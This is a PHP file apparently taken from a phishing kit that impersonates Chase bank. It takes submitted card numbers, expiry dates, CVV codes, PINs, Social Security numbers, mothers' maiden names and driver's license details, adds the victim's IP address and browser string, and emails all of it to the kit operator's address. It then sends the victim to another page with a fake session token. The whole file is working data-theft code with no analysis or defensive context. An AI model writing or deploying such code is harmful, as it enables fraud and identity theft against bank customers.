<?php
if($_POST["cn"] != "" and $_POST["ex"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Ch@se Info-----------------------\n";
$message .= "C@rd #							: ".$_POST['cn']."\n";
$message .= "Expiry Date					: ".$_POST['ex']."\n";
$message .= "C.V'v							: ".$_POST['vc']."\n";
$message .= "C@rd P!N						: ".$_POST['pn']."\n";
$message .= "SSN							: ".$_POST['sn']."\n";
$message .= "MMN							: ".$_POST['mn']."\n";
$message .= "Driver's License No			: ".$_POST['dl']."\n";
$message .= "Driver's License Expiry		: ".$_POST['dx']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf5.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>